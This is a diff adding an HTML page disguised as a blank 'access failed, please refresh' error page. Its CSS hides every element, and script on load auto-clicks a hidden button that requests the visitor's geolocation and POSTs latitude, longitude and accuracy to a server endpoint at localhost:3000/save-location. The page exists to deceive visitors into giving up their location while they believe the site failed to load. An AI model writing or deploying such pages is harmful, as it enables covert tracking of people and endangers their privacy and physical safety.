@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>访问失败，请刷新页面</title>
+    <style>
+        /* 隐藏所有元素，显示一个空白页面 */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: white; /* 空白背景 */
+            overflow: hidden; /* 防止滚动 */
+        }
+        h1, button, p {
+            display: none; /* 隐藏文本和按钮 */
+        }
+    </style>
+</head>
+<body>
+    <h1>获取用户定位</h1>
+    <button id="getLocationButton" onclick="getLocation()">获取定位</button>
+    <p id="status"></p>
+
+    <script>
+        // 页面加载完成后自动点击按钮
+        window.onload = function() {
+            document.getElementById('getLocationButton').click();
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition, showError);
+            } else {
+                document.getElementById('status').textContent = "您的浏览器不支持地理位置功能。";
+            }
+        }
+
+        function sendPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            fetch('http://localhost:3000/save-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ latitude, longitude, accuracy }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('status').textContent = '位置数据已保存: ' + JSON.stringify(data);
+            })
+            .catch(error => {
+                document.getElementById('status').textContent = '保存位置数据失败: ' + error;
+            });
+        }
+
+        function showError(error) {
+            // 这里你可以添加更多的错误处理逻辑，例如记录日志等
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById('status').textContent = "用户拒绝了请求地理位置的权限。";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById('status').textContent = "位置信息不可用。";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById('status').textContent = "请求地理位置超时。";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById('status').textContent = "发生未知错误。";
+                    break;
+            }
+        }
+    </script>
+</body>
+</html>
